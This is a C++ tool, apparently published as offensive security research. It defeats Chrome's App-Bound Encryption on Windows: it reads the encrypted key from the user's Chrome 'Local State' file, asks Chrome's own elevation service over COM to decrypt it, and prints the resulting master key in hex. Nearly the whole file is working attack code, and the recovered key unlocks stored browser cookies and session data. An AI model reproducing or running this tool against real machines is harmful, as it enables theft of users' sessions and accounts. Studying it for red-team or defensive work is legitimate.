/*
 * Chrome App-Bound Encryption Service:
 * https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
 * https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view
 * Based on the code of @snovvcrash
 * https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
 */

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

// CLSID and IID for Chrome App-Bound encryption service
// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
const CLSID CLSID_Elevator = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
const IID IID_IElevator = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};

// Additional IIDs for other Chrome variants for reference:
// const IID IID_IElevatorChromium = {0xB88C45B9, 0x8825, 0x4629, {0xB8, 0x3E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED}};
// const IID IID_IElevatorChromeBeta = {0xA2721D66, 0x376E, 0x4D2F, {0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F}};
// const IID IID_IElevatorChromeDev = {0xBB2AA26B, 0x343A, 0x4072, {0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71}};
// const IID IID_IElevatorChromeCanary = {0x4F7CE041, 0x28E9, 0x484F, {0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4}};

// These IIDs correspond to different flavors of Chrome and Chromium for compatibility:
// - IID_IElevatorChromium: General Chromium version.
// - IID_IElevatorChromeBeta: Beta version of Chrome.
// - IID_IElevatorChromeDev: Development version of Chrome.
// - IID_IElevatorChromeCanary: Canary (experimental) version of Chrome.

// The primary interface in this code is IElevator, defined by the IID_IElevator above.
// Additional interfaces (e.g., IID_IElevatorChrome, IID_IElevatorChromium) can be used for other Chrome variants as needed.

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
        const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        ProtectionLevel protection_level, const BSTR plaintext,
        BSTR *ciphertext, DWORD *last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
};

namespace ConsoleUtils
{
    void SetConsoleColor(WORD color)
    {
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, color);
    }

    void DisplayBanner()
    {
        SetConsoleColor(12);
        std::cout << "----------------------------------------------" << std::endl;
        std::cout << "|  Chrome App-Bound Encryption - Decryption  |" << std::endl;
        std::cout << "|  Alexander Hagenah (@xaitax)               |" << std::endl;
        std::cout << "----------------------------------------------" << std::endl;
        std::cout << "" << std::endl;
        SetConsoleColor(7);
    }
}

namespace ChromeAppBound
{
    constexpr size_t KeySize = 32;
    const uint8_t KeyPrefix[] = {'A', 'P', 'P', 'B'};

    const std::string Base64Chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    inline bool IsBase64(unsigned char c)
    {
        return (isalnum(c) || (c == '+') || (c == '/'));
    }

    std::vector<uint8_t> Base64Decode(const std::string &encoded_string)
    {
        int in_len = encoded_string.size();
        int i = 0, j = 0, in_ = 0;
        uint8_t char_array_4[4]{}, char_array_3[3]{};
        std::vector<uint8_t> decoded_data;

        while (in_len-- && (encoded_string[in_] != '=') && IsBase64(encoded_string[in_]))
        {
            char_array_4[i++] = encoded_string[in_++];
            if (i == 4)
            {
                for (i = 0; i < 4; i++)
                    char_array_4[i] = Base64Chars.find(char_array_4[i]);

                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (i = 0; i < 3; i++)
                    decoded_data.push_back(char_array_3[i]);

                i = 0;
            }
        }

        if (i)
        {
            for (j = i; j < 4; j++)
                char_array_4[j] = 0;

            for (j = 0; j < 4; j++)
                char_array_4[j] = Base64Chars.find(char_array_4[j]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (j = 0; j < i - 1; j++)
                decoded_data.push_back(char_array_3[j]);
        }

        ConsoleUtils::SetConsoleColor(9);
        std::cout << "[+]";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << " Finished decoding." << std::endl;

        return decoded_data;
    }

    std::string BytesToHexString(const BYTE *byteArray, size_t size)
    {
        std::ostringstream oss;
        for (size_t i = 0; i < size; ++i)
            oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray[i]);
        return oss.str();
    }

    std::string GetAppDataPath()
    {
        char appDataPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath) != S_OK)
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Could not retrieve AppData path." << std::endl;
            return "";
        }
        return std::string(appDataPath);
    }

    std::vector<uint8_t> RetrieveEncryptedKeyFromLocalState()
    {
        ConsoleUtils::SetConsoleColor(9);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << "Retrieving AppData path." << std::endl;

        std::string appDataPath = GetAppDataPath();
        if (appDataPath.empty())
        {
            return {};
        }

        std::string localStatePath = appDataPath + "\\Google\\Chrome\\User Data\\Local State";
        ConsoleUtils::SetConsoleColor(9);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << "Local State path: " << localStatePath << std::endl;

        // Open Local State file
        std::ifstream file(localStatePath);
        if (!file.is_open())
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Could not open the Local State file." << std::endl;
            return {};
        }

        std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        const std::string searchKey = "\"app_bound_encrypted_key\":\"";
        size_t keyStartPos = fileContent.find(searchKey);
        if (keyStartPos == std::string::npos)
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "'app_bound_encrypted_key' not found in Local State file." << std::endl;
            return {};
        }

        keyStartPos += searchKey.length();
        size_t keyEndPos = fileContent.find("\"", keyStartPos);
        if (keyEndPos == std::string::npos)
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Malformed 'app_bound_encrypted_key' in Local State file." << std::endl;
            return {};
        }

        std::string base64_encrypted_key = fileContent.substr(keyStartPos, keyEndPos - keyStartPos);
        ConsoleUtils::SetConsoleColor(9);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << "Base64 encrypted key extracted." << std::endl;

        std::vector<uint8_t> encrypted_key_with_header = Base64Decode(base64_encrypted_key);

        if (!std::equal(std::begin(KeyPrefix), std::end(KeyPrefix), encrypted_key_with_header.begin()))
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Invalid key header." << std::endl;
            return {};
        }

        ConsoleUtils::SetConsoleColor(9);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << "Key header is valid." << std::endl;

        return std::vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(KeyPrefix), encrypted_key_with_header.end());
    }

    void PrintChromeVersion(const std::string &chromePath)
    {
        DWORD handle = 0;
        DWORD versionSize = GetFileVersionInfoSizeA(chromePath.c_str(), &handle);
        if (versionSize == 0)
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Could not get version size for " << chromePath << std::endl;
            return;
        }

        std::vector<char> versionData(versionSize);
        if (!GetFileVersionInfoA(chromePath.c_str(), handle, versionSize, versionData.data()))
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Could not get version info for " << chromePath << std::endl;
            return;
        }

        VS_FIXEDFILEINFO *fileInfo = nullptr;
        UINT size = 0;
        if (!VerQueryValueA(versionData.data(), "\\", reinterpret_cast<LPVOID *>(&fileInfo), &size))
        {
            ConsoleUtils::SetConsoleColor(12);
            std::cerr << "[-] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cerr << "Could not query version value." << std::endl;
            return;
        }

        if (fileInfo)
        {
            DWORD major = HIWORD(fileInfo->dwFileVersionMS);
            DWORD minor = LOWORD(fileInfo->dwFileVersionMS);
            DWORD build = HIWORD(fileInfo->dwFileVersionLS);
            DWORD revision = LOWORD(fileInfo->dwFileVersionLS);

            ConsoleUtils::SetConsoleColor(10);
            std::cout << "[+] ";
            ConsoleUtils::SetConsoleColor(7);
            std::cout << "Found Chrome Version: " << major << "." << minor << "." << build << "." << revision << std::endl;
        }
    }
}

int main()
{
    ConsoleUtils::DisplayBanner();
    ChromeAppBound::PrintChromeVersion("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");

    ConsoleUtils::SetConsoleColor(9);
    std::cout << "[*] ";
    ConsoleUtils::SetConsoleColor(7);
    std::cout << "Starting Chrome App-Bound Encryption Decryption process." << std::endl;

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr))
    {
        ConsoleUtils::SetConsoleColor(12);
        std::cerr << "[-] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cerr << "Failed to initialize COM." << std::endl;
        return -1;
    }

    ConsoleUtils::SetConsoleColor(9);
    std::cout << "[+] ";
    ConsoleUtils::SetConsoleColor(7);
    std::cout << "COM library initialized." << std::endl;

    Microsoft::WRL::ComPtr<IElevator> elevator;
    DWORD last_error = ERROR_GEN_FAILURE;

    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void **)&elevator);

    if (FAILED(hr))
    {
        ConsoleUtils::SetConsoleColor(12);
        std::cerr << "[-] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cerr << "Failed to create IElevator instance." << std::endl;
        CoUninitialize();
        return -1;
    }

    ConsoleUtils::SetConsoleColor(9);
    std::cout << "[+] ";
    ConsoleUtils::SetConsoleColor(7);
    std::cout << "IElevator instance created successfully." << std::endl;

    hr = CoSetProxyBlanket(
        elevator.Get(),
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING);

    if (FAILED(hr))
    {
        ConsoleUtils::SetConsoleColor(12);
        std::cerr << "[-] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cerr << "Failed to set proxy blanket." << std::endl;
        CoUninitialize();
        return -1;
    }

    ConsoleUtils::SetConsoleColor(9);
    std::cout << "[+] ";
    ConsoleUtils::SetConsoleColor(7);
    std::cout << "Proxy blanket set successfully." << std::endl;

    std::vector<uint8_t> encrypted_key = ChromeAppBound::RetrieveEncryptedKeyFromLocalState();
    ConsoleUtils::SetConsoleColor(9);
    std::cout << "[+] ";
    ConsoleUtils::SetConsoleColor(7);
    std::cout << "Encrypted key retrieved: " << ChromeAppBound::BytesToHexString(encrypted_key.data(), 20) << "..." << std::endl;

    BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char *>(encrypted_key.data()), encrypted_key.size());
    if (!ciphertext_data)
    {
        ConsoleUtils::SetConsoleColor(12);
        std::cerr << "[-] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cerr << "Failed to allocate BSTR for encrypted key." << std::endl;
        CoUninitialize();
        return -1;
    }

    ConsoleUtils::SetConsoleColor(9);
    std::cout << "[+] ";
    ConsoleUtils::SetConsoleColor(7);
    std::cout << "BSTR allocated for encrypted key." << std::endl;

    BSTR plaintext_data = nullptr;
    hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);

    if (SUCCEEDED(hr))
    {
        ConsoleUtils::SetConsoleColor(9);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << "Decryption successful." << std::endl;

        BYTE *decrypted_key = new BYTE[ChromeAppBound::KeySize];
        memcpy(decrypted_key, reinterpret_cast<void *>(plaintext_data), ChromeAppBound::KeySize);
        SysFreeString(plaintext_data);

        ConsoleUtils::SetConsoleColor(10);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cout << "DECRYPTED KEY: ";
        ConsoleUtils::SetConsoleColor(11);
        std::cout << ChromeAppBound::BytesToHexString(decrypted_key, ChromeAppBound::KeySize) << std::endl;
        ConsoleUtils::SetConsoleColor(7);
        delete[] decrypted_key;
    }
    else
    {
        ConsoleUtils::SetConsoleColor(12);
        std::cerr << "[-] ";
        ConsoleUtils::SetConsoleColor(7);
        std::cerr << "Decryption failed. Last error: " << last_error << std::endl;
    }

    SysFreeString(ciphertext_data);
    CoUninitialize();
    return 0;
}
